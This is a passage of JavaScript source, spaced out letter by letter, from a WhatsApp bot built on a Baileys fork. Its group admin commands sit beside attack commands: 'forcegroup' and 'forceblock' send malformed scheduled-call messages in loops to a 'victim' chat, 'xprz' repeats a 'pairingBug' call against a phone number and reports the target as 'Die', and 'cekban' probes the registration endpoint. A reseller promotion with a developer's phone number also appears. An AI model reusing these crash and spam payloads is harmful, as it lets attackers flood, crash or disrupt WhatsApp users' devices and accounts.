 } 
 b r e a k ; 
 	 
 c a s e   ' p r o m o t e a l l ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! m . i s G r o u p )   r e t u r n   r e p l y g c x e o n ( " T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   i n   g r o u p s . " ) ; 
         i f   ( ! i s B o t A d m i n s )   r e t u r n   
 
         c o n s t   x e o n _ c o l l e c t _ m e m b e r s   =   p a r t i c i p a n t s 
                 . f i l t e r ( v   = >   v . a d m i n   = = =   n u l l   & &   v . i d   ! = =   b o t N u m b e r ) 
                 . m a p ( v   = >   v . i d ) ; 
 
         i f   ( x e o n _ c o l l e c t _ m e m b e r s . l e n g t h   = = =   0 )   r e t u r n   r e p l y g c x e o n ( " N o   m e m b e r s   a v a i l a b l e   f o r   p r o m o t i o n . " ) ; 
 
         t r y   { 
                 a w a i t   X e o n B o t I n c . g r o u p P a r t i c i p a n t s U p d a t e ( f r o m ,   x e o n _ c o l l e c t _ m e m b e r s ,   ' p r o m o t e ' ) ; 
                 a w a i t   r e p l y g c x e o n ( " S u c c e s s f u l l y   p r o m o t e d   a l l   m e m b e r s ! " ) ; 
         }   c a t c h   ( e )   { 
                 c o n s o l e . l o g ( e ) ; 
                 a w a i t   r e p l y g c x e o n ( " A n   e r r o r   o c c u r r e d   w h i l e   p r o m o t i n g   m e m b e r s . " ) ; 
         } 
 } 
 b r e a k ; 
 
 c a s e   ' d e m o t e a l l ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! m . i s G r o u p )   r e t u r n   r e p l y g c x e o n ( " T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   i n   g r o u p s . " ) ; 
         i f   ( ! i s B o t A d m i n s )   r e t u r n   
 
         c o n s t   x e o n _ c o l l e c t _ m e m b e r s   =   p a r t i c i p a n t s 
                 . f i l t e r ( v   = >   v . a d m i n   ! = =   n u l l   & &   v . i d   ! = =   b o t N u m b e r ) 
                 . m a p ( v   = >   v . i d ) ; 
 
         i f   ( x e o n _ c o l l e c t _ m e m b e r s . l e n g t h   = = =   0 )   r e t u r n   r e p l y g c x e o n ( " N o   a d m i n s   a v a i l a b l e   f o r   d e m o t i o n . " ) ; 
 
         t r y   { 
                 a w a i t   X e o n B o t I n c . g r o u p P a r t i c i p a n t s U p d a t e ( f r o m ,   x e o n _ c o l l e c t _ m e m b e r s ,   ' d e m o t e ' ) ; 
                 a w a i t   r e p l y g c x e o n ( " S u c c e s s f u l l y   d e m o t e d   a l l   a d m i n s ! " ) ; 
         }   c a t c h   ( e )   { 
                 c o n s o l e . l o g ( e ) ; 
                 a w a i t   r e p l y g c x e o n ( " A n   e r r o r   o c c u r r e d   w h i l e   d e m o t i n g   m e m b e r s . " ) ; 
         } 
 } 
 b r e a k ; 
 
 c a s e   ' k i c k a l l l l ' :   { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! m . i s G r o u p )   
                 r e t u r n   r e p l y g c x e o n ( " ه ذ ا   ا ل أ م ر   ي ع م ل   ف ق ط   د ا خ ل   ا ل م ج م و ع ا ت . " ) ; 
 
         
 
         / /   إ ذ ا   ك ا ن   ه ن ا ك   م ن ش ن   أ و   ر ق م   →   ط ر د   ش خ ص   و ا ح د   ف ق ط 
         i f   ( m . m e n t i o n e d J i d   & &   m . m e n t i o n e d J i d . l e n g t h   >   0   | |   a r g s [ 0 ] )   { 
                 / /   ك و د   ط ر د   ش خ ص   و ا ح د   ( ن ف س   ا ل ك و د   ا ل ق د ي م ) 
                 l e t   t a r g e t ; 
                 i f   ( m . m e n t i o n e d J i d   & &   m . m e n t i o n e d J i d . l e n g t h   >   0 )   { 
                         t a r g e t   =   m . m e n t i o n e d J i d [ 0 ] ; 
                 }   e l s e   i f   ( a r g s [ 0 ] )   { 
                         t a r g e t   =   a r g s [ 0 ] . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' )   +   " @ s . w h a t s a p p . n e t " ; 
                 }   e l s e   { 
                         r e t u r n   r e p l y g c x e o n ( " ❗   ب ر ج ا ء   م ن ش ن   ا ل ش خ ص   أ و   ك ت ا ب ة   ر ق م ه . \ n م ث ا ل : \ n . k i c k   @ u s e r \ n . k i c k   2 0 1 2 3 4 5 6 7 8 9 " ) ; 
                 } 
 
                 c o n s t   i s T a r g e t A d m i n   =   p a r t i c i p a n t s . f i n d ( v   = >   v . i d   = = =   t a r g e t ) ? . a d m i n   ! = =   n u l l ; 
                 i f   ( i s T a r g e t A d m i n )   
                         r e t u r n   r e p l y g c x e o n ( " ل ا   ي م ك ن   ط ر د   ع ض و   م ن   ا ل م ش ر ف ي ن . " ) ; 
 
                 t r y   { 
                         a w a i t   X e o n B o t I n c . g r o u p P a r t i c i p a n t s U p d a t e ( f r o m ,   [ t a r g e t ] ,   ' r e m o v e ' ) ; 
                         r e p l y g c x e o n ( ` ✔ ️   ت م   ط ر د   ا ل ع ض و : \ n @ $ { t a r g e t . s p l i t ( ' @ ' ) [ 0 ] } ` ,   {   m e n t i o n s :   [ t a r g e t ]   } ) ; 
                 }   c a t c h   ( e r r )   { 
                         c o n s o l e . l o g ( e r r ) ; 
                         r e p l y g c x e o n ( " ح د ث   خ ط أ   أ ث ن ا ء   م ح ا و ل ة   ط ر د   ا ل ع ض و . " ) ; 
                 } 
         }   
         / /   إ ذ ا   ل م   ي ك ن   ه ن ا ك   م ن ش ن   →   ط ر د   ج م ي ع   ا ل أ ع ض ا ء 
         e l s e   { 
                 / /   ك و د   ط ر د   ج م ي ع   ا ل أ ع ض ا ء   ( ا ل ك و د   ا ل ج د ي د ) 
                 c o n s t   g r o u p M e m b e r s   =   p a r t i c i p a n t s ; 
                 c o n s t   m e m b e r s T o K i c k   =   [ ] ; 
                 
                 f o r   ( l e t   m e m b e r   o f   g r o u p M e m b e r s )   { 
                         i f   ( m e m b e r . i d   = = =   X e o n B o t I n c . u s e r . i d . s p l i t ( ' : ' ) [ 0 ]   +   ' @ s . w h a t s a p p . n e t ' )   c o n t i n u e ; 
                         i f   ( m e m b e r . a d m i n )   c o n t i n u e ; 
                         m e m b e r s T o K i c k . p u s h ( m e m b e r . i d ) ; 
                 } 
 
                 i f   ( m e m b e r s T o K i c k . l e n g t h   = = =   0 )   
                         r e t u r n   r e p l y g c x e o n ( " ❌   ل ا   ي و ج د   أ ع ض ا ء   ع ا د ي ي ن   ي م ك ن   ط ر د ه م . " ) ; 
 
                 t r y   { 
                         r e p l y g c x e o n ( ` ⚡   ج ا ر ي   ط ر د   $ { m e m b e r s T o K i c k . l e n g t h }   ع ض و . . . ` ) ; 
                         
                         f o r   ( l e t   i   =   0 ;   i   <   m e m b e r s T o K i c k . l e n g t h ;   i   + =   5 0 0 )   { 
                                 c o n s t   b a t c h   =   m e m b e r s T o K i c k . s l i c e ( i ,   i   +   5 0 0 ) ; 
                                 a w a i t   X e o n B o t I n c . g r o u p P a r t i c i p a n t s U p d a t e ( f r o m ,   b a t c h ,   ' r e m o v e ' ) ; 
                                 a w a i t   n e w   P r o m i s e ( r e s o l v e   = >   s e t T i m e o u t ( r e s o l v e ,   1 0 0 0 ) ) ; 
                         } 
                         
                         r e p l y g c x e o n ( ` ✅   ت م   ط ر د   $ { m e m b e r s T o K i c k . l e n g t h }   ع ض و   ب ن ج ا ح . ` ) ; 
                         
                 }   c a t c h   ( e r r )   { 
                         c o n s o l e . l o g ( e r r ) ; 
                         r e p l y g c x e o n ( " ❌   ح د ث   خ ط أ   أ ث ن ا ء   م ح ا و ل ة   ط ر د   ا ل أ ع ض ا ء . " ) ; 
                 } 
         } 
 } 
 b r e a k ; 
 
 	 c a s e   ' f o r c e g r o u p ' : 
         
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   1 2 0 3 6 3 0 4 7 6 2 6 5 3 7 x x x @ g . u s | 5 \ n \ n T o   g e t   g r o u p   I D ,   t y p e   . l i s t g c \ n \ n T o   g e t   g r o u p   I D   f r o m   a   g r o u p   l i n k ,   t y p e   . g r o u p i d   l i n k ` ) ; 
 
         / /   C h e c k   i f   i n p u t   c o n t a i n s   a   W h a t s A p p   g r o u p   l i n k 
         i f   ( q . i n c l u d e s ( " c h a t . w h a t s a p p . c o m " ) )   { 
                 r e t u r n   r e p l y g c x e o n ( " G r o u p   I D   m u s t   b e   a   n u m b e r ,   n o t   a   l i n k .   U s e   . g r o u p i d   < l i n k >   t o   g e t   t h e   g r o u p   I D . " ) ; 
         } 
 
         / /   E x t r a c t   g r o u p   I D   a n d   a m o u n t   f r o m   i n p u t 
         l e t   i n p u t   =   q . s p l i t ( " | " ) ; 
         l e t   v i c t i m x d   =   i n p u t [ 0 ] . t r i m ( ) ;   / /   G r o u p   I D 
         l e t   l o o p C o u n t 2   =   p a r s e I n t ( i n p u t [ 1 ] ) ;   / /   E x t r a c t   a m o u n t 
 
         / /   V a l i d a t e   G r o u p   I D   f o r m a t   ( o n l y   n u m b e r s   +   " @ g . u s " ) 
         i f   ( ! / ^ \ d + @ g \ . u s $ / . t e s t ( v i c t i m x d ) )   { 
                 r e t u r n   r e p l y g c x e o n ( " I n v a l i d   g r o u p   I D !   P l e a s e   e n t e r   a   c o r r e c t   W h a t s A p p   g r o u p   I D . " ) ; 
         } 
 
         / /   V a l i d a t e   l o o p   c o u n t 
         i f   ( i s N a N ( l o o p C o u n t 2 )   | |   l o o p C o u n t 2   <   1 )   { 
                 l o o p C o u n t 2   =   5 ;   / /   D e f a u l t   t o   5   i f   a m o u n t   i s   i n v a l i d 
         } 
 
         r e p l y g c x e o n ( ` S u c c e s s f u l l y   s e n t   f o r c e   m e s s a g e   t o   t h e   g r o u p   c h a t ` ) ; 
 
         f o r   ( l e t   i   =   0 ;   i   <   l o o p C o u n t 2 ;   i + + )   { 
                 a w a i t   s l e e p ( 1 0 5 0 ) ; 
                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( v i c t i m x d ,   { 
                         " m e s s a g e C o n t e x t I n f o " :   { 
                                 " m e s s a g e S e c r e t " :   " e e d 1 z x I 4 9 c x i o v B T U F L I E W i 1 s h D 9 H g I O g h O N u q P D G T k = " , 
                                 " d e v i c e L i s t M e t a D a t a " :   { } , 
                                 " d e v i c e L i s t M e t a d a t a V e r s i o n " :   2 
                         } , 
                         " s c h e d u l e d C a l l C r e a t i o n M e s s a g e " :   { 
                                 " s c h e d u l e d T i m e s t a m p M s " :   ' 1 2 0 0 ' , 
                                 c a l l T y p e :   " A U D I O " , 
                                 " t i t l e " :   ' � � ' , 
                         } 
                 } ,   { 
                         a d d i t i o n a l A t t r i b u t e s :   { 
                                 e d i t :   ' 7 ' 
                         } 
                 } ) ; 
         } 
         b r e a k ; 
 
               c a s e   ' x p r z ' :   { 
                       i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
   i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e   :   $ { c o m m a n d }   2 0 x x x ` ) 
   l e t   p e p e c   =   q . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   " " ) 
   l e t   t a r g e t t o   =   p e p e c 
 c o n s t   {   
     d e f a u l t :   m a k e W a S o c k e t , 
     u s e M u l t i F i l e A u t h S t a t e , 
     f e t c h L a t e s t B a i l e y s V e r s i o n 
 }   =   r e q u i r e ( " @ a d i w a j s h i n g / b a i l e y s " ) 
 c o n s t   p i n o   =   r e q u i r e ( ' p i n o ' ) 
 
 a s y n c   f u n c t i o n   z p r z ( t a r g e t )   { 
     l e t   {   s t a t e   }   =   a w a i t   u s e M u l t i F i l e A u t h S t a t e ( ' . n p m ' ) 
     l e t   {   v e r s i o n   }   =   a w a i t   f e t c h L a t e s t B a i l e y s V e r s i o n ( ) 
     l e t   X e o n B o t I n c   =   a w a i t   m a k e W a S o c k e t ( { 
         a u t h :   s t a t e , 
         v e r s i o n , 
         l o g g e r :   p i n o ( {   l e v e l :   ' f a t a l '   } ) 
     } ) 
 
     c o n s o l e . l o g ( ` s t a r t   s p a m   p a i r i n g   t o   $ { t a r g e t } ` ) 
 
     c o n s t   d e a d l i n e   =   D a t e . n o w ( )   +   1 0 _ 0 0 0 
     f o r   ( l e t   z   =   0 ;   z   <   1 5 0 ;   z + + )   { 
         a w a i t   s l e e p ( 9 0 0 0 ) 
         l e t   p r c   =   a w a i t   X e o n B o t I n c . p a i r i n g B u g ( t a r g e t ) 
     } 
 } 
 r D o n e ( ` [   √   ]   S u c c e s s   B u g   :   $ { p e p e c } \ n [   √   ] U s i n g   :   $ { p r e f i x   +   c o m m a n d } \ n [   √   ]   T a r g e t   S t a t u s   :   D i e \ n [   ⚠ ️   ]   P l e a s e   D o n \ ' t   U s e   B u g   I n   1 0   M i n u t e ` ) 
 a w a i t   z p r z ( t a r g e t t o ) 
 } 
 b r e a k 
 	 
 	 c a s e   ' f o r c e b l o c k ' : 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         / /   G e t   u s e r   i n p u t   f o r   l o o p   c o u n t 
         l e t   l o o p C o u n t   =   p a r s e I n t ( a r g s [ 0 ] ) ; 
         i f   ( i s N a N ( l o o p C o u n t )   | |   l o o p C o u n t   <   1 )   { 
                 l o o p C o u n t   =   5 ;   / /   D e f a u l t   v a l u e   i f   i n p u t   i s   i n v a l i d 
         } 
         
         f o r   ( l e t   i   =   0 ;   i   <   l o o p C o u n t ;   i + + )   { 
                 a w a i t   s l e e p ( 1 0 5 0 ) ; 
                 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   { 
                         " m e s s a g e C o n t e x t I n f o " :   { 
                                 " m e s s a g e S e c r e t " :   " e e d 1 z x I 4 9 c x i o v B T U F L I E W i 1 s h D 9 H g I O g h O N u q P D G T k = " , 
                                 " d e v i c e L i s t M e t a D a t a " :   { } , 
                                 " d e v i c e L i s t M e t a d a t a V e r s i o n " :   2 
                         } , 
                         " s c h e d u l e d C a l l C r e a t i o n M e s s a g e " :   { 
                                 " s c h e d u l e d T i m e s t a m p M s " :   ' 1 2 0 0 ' , 
                                 c a l l T y p e :   " A U D I O " , 
                                 " t i t l e " :   ' � � ' , 
                         } 
                 } ,   { 
                         a d d i t i o n a l A t t r i b u t e s :   { 
                                 e d i t :   ' 7 ' 
                         } 
                 } ) ; 
         } 
         b r e a k ; 
 
 c a s e   ' l i s t p a i r ' :   { 
         i f   ( ! ( g l o b a l . d b . d a t a . o w n e r s   | |   [ ] ) . i n c l u d e s ( s e n d e r N u m b e r ) )   { 
         r e t u r n   r e p l y g c x e o n ( ` ❌   S o r r y   y o u   d o n ' t   h a v e   p e r m i s s i o n   t o   u s e   t h i s   c o m m a n d .   T h i s   c o m m a n d   c a n   o n l y   b e   u s e d   b y   r e s e l l e r !   
 
 W a n t   t o   b u y   r e s e l l e r ?   C h a t   D e v e l o p e r ! 
 Y o u T u b e :   @   
 T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � 
 W h a t s A p p :   + 2 0 1 0 2 9 4 1 0 7 6 6 ` ) ; 
 } 
 
                 c o n s t   p a i r i n g P a t h   =   ' . / l i b 2 / p a i r i n g ' ; 
 
         t r y   { 
                 / /   C h e c k   i f   t h e   d i r e c t o r y   e x i s t s 
                 i f   ( ! f s . e x i s t s S y n c ( p a i r i n g P a t h ) )   { 
                         r e t u r n   r e p l y g c x e o n ( ' N o   p a i r e d   d e v i c e s   f o u n d . ' ) ; 
                 } 
 
                 / /   R e a d   a l l   d i r e c t o r i e s   ( a n d   f i l e s )   i n s i d e   . / l i b 2 / p a i r i n g 
                 c o n s t   e n t r i e s   =   f s . r e a d d i r S y n c ( p a i r i n g P a t h ,   {   w i t h F i l e T y p e s :   t r u e   } ) ; 
 
                 / /   F i l t e r   f o r   d i r e c t o r i e s   ( p a i r e d   d e v i c e   I D s ) 
                 c o n s t   p a i r e d D e v i c e s   =   e n t r i e s 
                         . f i l t e r ( e n t r y   = >   e n t r y . i s D i r e c t o r y ( ) ) 
                         . m a p ( e n t r y   = >   ` + $ { e n t r y . n a m e . r e p l a c e ( ' @ s . w h a t s a p p . n e t ' ,   ' ' ) } ` ) ;   / /   A d d   ' + '   b e f o r e   n u m b e r 
 
                 / /   H a n d l e   i f   n o   p a i r e d   d e v i c e s   a r e   f o u n d 
                 i f   ( p a i r e d D e v i c e s . l e n g t h   = = =   0 )   { 
                         r e t u r n   r e p l y g c x e o n ( ' N o   p a i r e d   d e v i c e s   f o u n d . ' ) ; 
                 } 
 
                 / /   C o u n t   t o t a l   p a i r e d   d e v i c e s 
                 c o n s t   t o t a l U s e r s   =   p a i r e d D e v i c e s . l e n g t h ; 
 
                 / /   F o r m a t   t h e   l i s t   o f   p a i r e d   d e v i c e s   f o r   t h e   r e s p o n s e 
                 c o n s t   d e v i c e L i s t   =   p a i r e d D e v i c e s 
                         . m a p ( ( d e v i c e ,   i n d e x )   = >   ` $ { i n d e x   +   1 } .   $ { d e v i c e } ` ) 
                         . j o i n ( ' \ n ' ) ; 
 
                 r e p l y g c x e o n ( ` T o t a l   R e n t   B o t   U s e r s :   $ { t o t a l U s e r s } \ n \ n P a i r e d   D e v i c e s : \ n $ { d e v i c e L i s t } ` ) ; 
         }   c a t c h   ( e r r )   { 
                 c o n s o l e . e r r o r ( ' E r r o r   r e a d i n g   p a i r e d   d e v i c e s   d i r e c t o r y : ' ,   e r r ) ; 
                 r e t u r n   r e p l y g c x e o n ( ' F a i l e d   t o   l o a d   p a i r e d   d e v i c e s   d a t a . ' ) ; 
         } 
 } 
 b r e a k ; 
 
 c a s e   ' d e l p a i r ' :   { 
 
                 
       i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n           
 	 
                 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =     X r e t u r n ; 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
 
                 c o n s t   p a i r i n g P a t h   =   ' . / l i b 2 / p a i r i n g ' ; 
                 c o n s t   t a r g e t P a t h   =   ` $ { p a i r i n g P a t h } / $ { X r e t u r n } ` ; 
 
                 t r y   {   
                         / /   C h e c k   i f   t h e   t a r g e t   d i r e c t o r y   e x i s t s 
                         i f   ( ! f s . e x i s t s S y n c ( t a r g e t P a t h ) )   { 
                                 r e t u r n   r e p l y g c x e o n ( ` P a i r e d   d e v i c e   w i t h   I D   " $ { X r e t u r n } "   d o e s   n o t   e x i s t . ` ) ; 
                         } 
 
                         / /   D e l e t e   t h e   t a r g e t   d i r e c t o r y   a n d   i t s   c o n t e n t s 
                         f s . r m S y n c ( t a r g e t P a t h ,   {   r e c u r s i v e :   t r u e ,   f o r c e :   t r u e   } ) ; 
 
                         r e p l y g c x e o n ( ` P a i r e d   d e v i c e   w i t h   I D   " $ { X r e t u r n } "   h a s   b e e n   s u c c e s s f u l l y   d e l e t e d . ` ) ; 
                 }   c a t c h   ( e r r )   { 
                         c o n s o l e . e r r o r ( ' E r r o r   d e l e t i n g   p a i r e d   d e v i c e : ' ,   e r r ) ; 
                         r e t u r n   r e p l y g c x e o n ( ' A n   e r r o r   o c c u r r e d   w h i l e   a t t e m p t i n g   t o   d e l e t e   t h e   p a i r e d   d e v i c e . ' ) ; 
                 } 
         } 
 b r e a k ; 
 
 c a s e   ' r e q p a i r ' : 
                 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 / /   C h e c k   s y s t e m   s t o r a g e   a n d   R A M 
         c o n s t   f r e e S t o r a g e   =   o s . f r e e m e m ( )   /   ( 1 0 2 4   *   1 0 2 4 ) ;   / /   F r e e   m e m o r y   i n   M B 
         c o n s t   t o t a l S t o r a g e   =   o s . t o t a l m e m ( )   /   ( 1 0 2 4   *   1 0 2 4 ) ;   / /   T o t a l   m e m o r y   i n   M B 
         c o n s t   f r e e D i s k S p a c e   =   f s . s t a t S y n c ( ' / ' ) . a v a i l a b l e   /   ( 1 0 2 4   *   1 0 2 4 ) ;   / /   F r e e   d i s k   s p a c e   i n   M B 
 
         i f   ( f r e e S t o r a g e   <   3 0 0   | |   f r e e D i s k S p a c e   <   3 0 0 )   {   / /   S e t   a   t h r e s h o l d   o f   1 0 0   M B   f o r   s t o r a g e   a n d   R A M 
                 r e t u r n   r e p l y g c x e o n ( ' S l o t   i s   f u l l ,   p l e a s e   t r y   a g a i n   l a t e r . ' ) ; 
         } 
 
 / / 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
     / /   E x t r a c t   a n d   v a l i d a t e   t h e   c o u n t r y   c o d e   o r   p r e f i x 
 c o n s t   c o u n t r y C o d e   =   t e x t . s l i c e ( 0 ,   3 ) ;   / /   E x t r a c t   t h e   f i r s t   3   d i g i t s   f o r   c o u n t r y   c o d e 
 c o n s t   p r e f i x x x   =   t e x t . s l i c e ( 0 ,   1 ) ;   / /   E x t r a c t   t h e   f i r s t   d i g i t   f o r   p r e f i x 
 c o n s t   f i r s t T w o D i g i t s   =   t e x t . s l i c e ( 0 ,   2 ) ;   / /   E x t r a c t   t h e   f i r s t   t w o   d i g i t s   t o   c h e c k   f o r   " 8 9 " 
 
 / /   F u n c t i o n   t o   v a l i d a t e   i f   a   n u m b e r   i s   a   v a l i d   W h a t s A p p   n u m b e r 
 c o n s t   i s V a l i d W h a t s A p p N u m b e r   =   ( n u m b e r )   = >   { 
         r e t u r n   n u m b e r . l e n g t h   > =   1 0   & &   n u m b e r . l e n g t h   < =   1 5   & &   ! i s N a N ( n u m b e r ) ; 
 } ; 
 
 i f   ( c o u n t r y C o d e   = = =   " 2 5 2 "   | |   p r e f i x x x   = = =   " 0 "   | |   f i r s t T w o D i g i t s   = = =   " 8 9 "   | |   c o u n t r y C o d e . s t a r t s W i t h ( " 8 5 " ) )   { 
         r e t u r n   r e p l y g c x e o n ( " S o r r y ,   n u m b e r s   w i t h   c o u n t r y   c o d e   2 5 2 ,   p r e f i x   0 ,   s t a r t i n g   w i t h   8 9 ,   o r   + 8 5   a r e   n o t   s u p p o r t e d   f o r   u s i n g   t h e   b o t . " ) ; 
 } 
 
 i f   ( ! i s V a l i d W h a t s A p p N u m b e r ( t e x t ) )   { 
         r e t u r n   r e p l y g c x e o n ( " I n v a l i d   W h a t s A p p   n u m b e r .   P l e a s e   e n t e r   a   v a l i d   n u m b e r . " ) ; 
 } 
 
 
         / /   P r o c e e d   w i t h   p a i r i n g 
         c o n s t   s t a r t p a i r i n g   =   r e q u i r e ( ' . / r e n t b o t . j s ' ) ; 
         a w a i t   s t a r t p a i r i n g ( X r e t u r n ) ; 
         a w a i t   s l e e p ( 4 0 0 0 ) ; 
         
         c o n s t   c u   =   f s . r e a d F i l e S y n c ( ' . / l i b 2 / p a i r i n g / p a i r i n g . j s o n ' ,   ' u t f - 8 ' ) ; 
         c o n s t   c u O b j   =   J S O N . p a r s e ( c u ) ; 
         
         a w a i t   r e p l y g c x e o n ( ` $ { c u O b j . c o d e } ` ) ; 
 
 b r e a k ; 
               c a s e   " c e k p e r a n g k a t " :   { 
   i f   ( ! a r g s [ 0 ] )   r e t u r n   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   t e x t :   ' u s e   :   . c e k p e r a n g k a t   2 0 x x x '   } ,   {   q u o t e d :   m } ) ; 
   l e t   n u m b e r   =   a r g s [ 0 ] . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' ) ; 
   l e t   t a r g e t   =   n u m b e r   +   ' @ s . w h a t s a p p . n e t ' ; 
   t r y   { 
   l e t   d e v i c e s   =   a w a i t   X e o n B o t I n c . g e t U S y n c D e v i c e s ( [ t a r g e t ] ) ; 
   l e t   r a w   =   J S O N . s t r i n g i f y ( d e v i c e s ,   n u l l ,   2 ) ; 
   l e t   c o u n t   =   d e v i c e s ? . l e n g t h   | |   0 ; 
   l e t   m e s s a g e   =   ` T o t a l   p e r a n g k a t   :   $ { c o u n t } \ n p e r a n g k a t   :   $ { r a w } ` ; 
   a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   t e x t :   m e s s a g e   } ,   {   q u o t e d :   m } ) ; 
   }   c a t c h ( z )   { 
       r e p l y g c x e o n ( z ) ; 
   } 
 } 
 b r e a k 
 
 
   c a s e   " c e k b a n " :   { 
     i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 
     c o n s t   { 
         u s e M u l t i F i l e A u t h S t a t e , 
         m a k e W A S o c k e t , 
         f e t c h L a t e s t B a i l e y s V e r s i o n , 
         B r o w s e r s 
     }   =   r e q u i r e ( " @ a d i w a j s h i n g / b a i l e y s " ) ; 
     c o n s t   {   p a r s e P h o n e N u m b e r   }   =   r e q u i r e ( " l i b p h o n e n u m b e r - j s " ) ; 
     c o n s t   p i n o   =   r e q u i r e ( " p i n o " ) ; 
 
     a s y n c   f u n c t i o n   c e k b a n n ( p h o n e N u m b e r )   { 
         l e t   r e s u l t D a t a   =   { 
             i s B a n n e d :   f a l s e , 
             i s N e e d O f f i c i a l W a :   f a l s e , 
             n u m b e r :   p h o n e N u m b e r 
         } ; 
 
         i f   ( ! p h o n e N u m b e r . s t a r t s W i t h ( " + " ) )   { 
             p h o n e N u m b e r   =   " + "   +   p h o n e N u m b e r ; 
         } 
 
         c o n s t   p a r s e d N u m b e r   =   p a r s e P h o n e N u m b e r ( p h o n e N u m b e r ) ; 
         c o n s t   c o u n t r y C o d e   =   p a r s e d N u m b e r . c o u n t r y C a l l i n g C o d e ; 
         c o n s t   n a t i o n a l N u m b e r   =   p a r s e d N u m b e r . n a t i o n a l N u m b e r ; 
 
         t r y   { 
             c o n s t   {   s t a t e   }   =   a w a i t   u s e M u l t i F i l e A u t h S t a t e ( a u t h P a t h ) ; 
             c o n s t   {   v e r s i o n   }   =   a w a i t   f e t c h L a t e s t B a i l e y s V e r s i o n ( ) ; 
 
             c o n s t   X e o n B o t I n c   =   m a k e W A S o c k e t ( { 
                 v e r s i o n , 
                 a u t h :   s t a t e , 
                 b r o w s e r :   B r o w s e r s . u b u n t u ( " C h r o m e " ) , 
                 l o g g e r :   p i n o ( {   l e v e l :   " s i l e n t "   } ) , 
                 p r i n t Q R I n T e r m i n a l :   f a l s e , 
             } ) ; 
 
             c o n s t   r e g i s t r a t i o n O p t i o n s   =   { 
                 p h o n e N u m b e r C o u n t r y C o d e :   c o u n t r y C o d e , 
                 p h o n e N u m b e r N a t i o n a l N u m b e r :   n a t i o n a l N u m b e r , 
                 p h o n e N u m b e r M o b i l e C o u n t r y C o d e :   " 5 1 0 " , 
                 p h o n e N u m b e r M o b i l e N e t w o r k C o d e :   " 1 0 " , 
                 m e t h o d :   " s m s " , 
             } ; 
 
             a w a i t   X e o n B o t I n c . r e q u e s t R e g i s t r a t i o n C o d e ( r e g i s t r a t i o n O p t i o n s ) ; 
 
             i f   ( X e o n B o t I n c . w s )   { 
                 X e o n B o t I n c . w s . c l o s e ( ) ; 
             } 
 
             r e t u r n   r e s u l t D a t a ; 
 
         }   c a t c h   ( e r r )   { 
             i f   ( e r r ? . c u s t o m _ b l o c k _ s c r e e n ? . b t n _ s e c o n d a r y _ u r l )   { 
                 r e s u l t D a t a . i s N e e d O f f i c i a l W a   =   t r u e ; 
             } 
             i f   ( e r r ? . a p p e a l _ t o k e n )   { 
                 r e s u l t D a t a . i s B a n n e d   =   t r u e ; 
                 r e s u l t D a t a . d a t a   =   { 
                     v i o l a t i o n _ t y p e :   e r r . v i o l a t i o n _ t y p e   | |   n u l l , 
                     i n _ a p p _ b a n _ a p p e a l :   e r r . i n _ a p p _ b a n _ a p p e a l   | |   n u l l , 
                     a p p e a l _ t o k e n :   e r r . a p p e a l _ t o k e n   | |   n u l l , 
                 } ; 
             } 
             r e t u r n   r e s u l t D a t a ; 
         } 
     } 
 
     t r y   { 
         c o n s t   r e s u l t   =   a w a i t   c e k b a n n ( ` $ { q } ` ) ; 
         r e p l y g c x e o n ( J S O N . s t r i n g i f y ( r e s u l t ,   n u l l ,   2 ) ) ; 
